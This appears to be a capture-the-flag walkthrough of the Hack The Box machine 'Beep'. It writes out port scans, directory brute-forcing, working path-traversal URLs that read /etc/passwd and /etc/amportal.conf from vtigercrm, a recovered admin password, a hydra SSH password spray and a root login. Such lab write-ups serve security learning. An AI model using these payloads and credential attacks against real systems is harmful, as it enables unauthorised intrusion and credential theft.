* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)

![alt text](./img/beep00.PNG?raw=true)  

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.7 -e tun0 --rate=100  
![alt text](./img/beep01.PNG?raw=true)  

nmap -v -A -sC -p 5038,877,10000,80,4190,443,25,993,4445,4559,111,995,110,143,3306,22 10.10.10.7  
![alt text](./img/beep16.PNG?raw=true)  

gobuster dir -u https://10.10.10.7 -w ~/wordlists/big.txt -t 100 -e -x php,html,aspx,txt,log,xml -k  
![alt text](./img/beep02.PNG?raw=true)  

## Exploit

A lot of things to check, but i had never saw the folder vtigercrm, so i started with it  
![alt text](./img/beep03.PNG?raw=true)  

searchsploit vtiger 5.1  
![alt text](./img/beep04.PNG?raw=true)  

searchsploit -x php/webapps/18770.txt  
![alt text](./img/beep05.PNG?raw=true)  

So let’s try to use this URL, only changing the LOCALHOST to 10.10.10.7  
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00  
![alt text](./img/beep06.PNG?raw=true)  

We can copy this content and put on a text editor, and adjust it to a better look  
![alt text](./img/beep07.PNG?raw=true)  

We have some good information here, but let’s start with the users. We have spamfilter and fanis with home directories  

I tried to find some useful files without success, so a i returned to searchsploit  
searchsploit elastix  
![alt text](./img/beep08.PNG?raw=true)  

The LFI caught my attention because it could show me another important file to exploit  
searchsploit -x php/webapps/37637.pl  
![alt text](./img/beep09.PNG?raw=true)  

Ok, it’s another LFI vector, but it give other file as POC. Let’s try to read it, you can choode this new url or the old one  
- https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action  
- https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/amportal.conf%00  

You can adain copy the text to organize it, but is easier just see the source code of the page  
![alt text](./img/beep10.PNG?raw=true)  

Some very useful information. Testing the credential admin:jEhdIekWmdjE we can login on 10.10.10.7 page  
![alt text](./img/beep11.PNG?raw=true)  

Maybe this same password work with some of the users found on passwd file.  
So let’s create a user.txt file with all the users and test the password with hydra  
cat user.txt  
![alt text](./img/beep12.PNG?raw=true)  

hydra ssh://10.10.10.7 -L user.txt -p jEhdIekWmdjE -t 64  
![alt text](./img/beep13.PNG?raw=true)  

## Privesc  

Ok….so we have root password  
ssh root@10.10.10.7  
![alt text](./img/beep14.PNG?raw=true)  

HABEMUS SHELL \o/  

Now, since we are root, just search and grab the flags  
![alt text](./img/beep15.PNG?raw=true)  

